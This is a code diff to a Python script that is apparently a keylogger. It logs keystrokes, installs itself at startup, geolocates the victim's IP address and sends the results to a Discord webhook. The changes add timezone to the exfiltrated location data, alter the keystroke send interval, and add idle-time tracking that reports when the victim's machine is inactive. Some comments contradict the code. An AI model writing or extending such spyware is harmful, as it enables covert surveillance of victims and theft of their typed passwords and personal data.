@@ -41,16 +41,17 @@ def get_location():
         region = data.get("region", "Unknown")
         country = data.get("country", "Unknown")
         postal = data.get("postal", "Unknown")
-        return city, region, country, postal
+        timezone = data.get("timezone", "Unknown")  # Get timezone information
+        return city, region, country, postal, timezone
     except requests.exceptions.RequestException as e:
         print(f"Error fetching location: {e}")
-        return "Unknown", "Unknown", "Unknown", "Unknown"
+        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
 
 # Get IP Addresses
 IPV4_ADDRESS, IPV6_ADDRESS = get_local_ips()
 
 # Get Location
-CITY, REGION, COUNTRY, POSTAL = get_location()
+CITY, REGION, COUNTRY, POSTAL, TIMEZONE = get_location()
 
 # Tracking Variables
 last_logged = None
@@ -78,7 +79,7 @@ def send_to_discord(title, description, color):
 def log_system_start():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     message = (f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - "
-               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL} - Connection Established")
+               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL}, Timezone: {TIMEZONE} - Connection Established")
     send_to_discord("SYSTEM START", message, 65280)  # Green
 
 # Function to log system shutdown
@@ -151,7 +152,7 @@ listener.start()
 # Function to periodically send keystrokes
 def keystroke_monitor():
     while True:
-        time.sleep(3)  # Check every second
+        time.sleep(5)  # Check every second
         send_keystrokes()
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -171,17 +172,31 @@ def add_to_startup():
 # Add to startup
 add_to_startup()
 
-# Function to monitor if the script is still running
-def monitor_running():
-    while True:
-        time.sleep(10)  # Check every 10 seconds
-        if not psutil.pid_exists(os.getpid()):  # Check if the current process is still running
-            log_system_shutdown()  # Log if the process is not running
-            break
+# Function to check idle time
+def get_idle_duration():
+    last_input_info = win32api.GetLastInputInfo()
+    idle_time = (win32api.GetTickCount() - last_input_info) / 1000.0  # Convert to seconds
+    return idle_time
 
-# Start the monitoring thread
-monitor_thread = threading.Thread(target=monitor_running, daemon=True)
-monitor_thread.start()
+# Function to monitor idle time
+def monitor_idle_time():
+    idle_duration = 0
+    while True:
+        time.sleep(1)  # Check every second
+        idle_duration = get_idle_duration()
+        if idle_duration >= 5:  # 10 seconds of inactivity
+            log_idle_connection(idle_duration)
+
+def log_idle_connection(duration):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    message = (f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - "
+               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL}, Timezone: {TIMEZONE} - "
+               f"SYSTEM IDLE for {duration} seconds.")
+    send_to_discord("SYSTEM IDLE", message, 16776960)  # Yellow
+
+# Start the idle time monitoring thread
+idle_monitor_thread = threading.Thread(target=monitor_idle_time, daemon=True)
+idle_monitor_thread.start()
 
 # Monitoring loop
 def monitor():
